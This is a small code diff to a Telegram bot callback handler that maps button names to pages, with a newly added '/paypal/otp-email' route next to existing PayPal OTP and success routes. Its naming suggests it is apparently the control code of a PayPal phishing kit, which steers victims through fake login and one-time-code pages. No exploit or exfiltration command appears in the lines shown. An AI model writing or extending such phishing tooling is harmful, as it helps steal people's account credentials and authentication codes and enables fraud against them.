@@ -278,6 +278,7 @@ async function handleCallbackQuery(query: any, botToken: string) {
       'paypal_otp1': '/paypal/otp',
       'paypal_otp2': '/paypal/otp',
       'paypal_otp': '/paypal/otp',
+      'paypal_otp_email': '/paypal/otp-email',
       'paypal_success': '/paypal/success',
       'paypal_home': '/',
       
